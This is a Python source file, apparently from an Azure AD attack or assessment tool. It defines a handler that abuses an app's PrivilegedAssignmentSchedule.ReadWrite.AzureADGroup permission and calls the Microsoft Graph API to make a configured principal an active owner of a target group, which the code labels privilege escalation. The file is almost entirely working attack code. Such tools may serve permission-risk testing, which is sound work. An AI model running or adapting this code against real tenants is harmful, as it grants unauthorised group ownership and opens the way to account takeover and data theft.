from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests
from datetime import datetime, timedelta

logger = logger.createLogger('attacks.handlers.group_pim_handler')


class GroupPIM_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup" in request.roles:
            status = False
            attack_name = "PrivilegedAssignmentScheduleRWVectors"
            message = ""
            error = "PrivilegedAssignmentScheduleRWVectors - failed"
            conf = request.attack_config['Gpim']
            
            logger.debug("PrivilegedAssignmentSchedule.ReadWrite.AzureADGroup - Allows the app to read, create, and delete time-based assignment schedules for access to Azure AD groups, without a signed-in user.")
            
            logger.debug("Attack vector - privilege escalation.")       
            try:

                create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/privilegedAccess/group/assignmentScheduleRequests"
                current_time = datetime.now()
                two_hour_delta = timedelta(hours=2) # for some reason, it puts it 2 hours from now.
                updated_time = current_time - two_hour_delta
                formatted_time = updated_time.strftime("%Y-%m-%dT%H:%M:%SZ")
                message_obj = {
                "accessId": "owner",
                "principalId": conf["principal"],
                "groupId": conf["groupId"],
                "action": "adminAssign",
                "scheduleInfo": {
                    "startDateTime": formatted_time,
                    "expiration": {
                    "type": "afterDuration",
                    "duration": "PT2H"
                    }
                },
                "justification": "Assign active owner access."
                }

                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                print(result.status_code)
                print(result.json())
                if result.status_code == 201:
                    message += "Added %s to %s \n" % (conf["principal"], conf["groupId"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in GroupPIM_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
        
